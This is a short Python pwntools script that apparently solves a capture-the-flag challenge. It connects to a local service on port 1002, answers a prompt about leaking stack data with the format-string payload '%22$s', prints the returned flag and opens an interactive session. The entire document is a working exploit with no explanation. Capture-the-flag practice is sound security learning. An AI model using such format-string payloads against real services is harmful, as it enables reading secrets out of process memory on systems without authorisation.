from pwn import *

host = '0.0.0.0'
port = 1002
p = remote(host,port)
#p = process('./chall')

payload = b"%22$s"
p.sendlineafter(b"How can you leak data off the stack ?",payload)

flag = p.recvuntil(b"")
print(flag)

p.interactive()
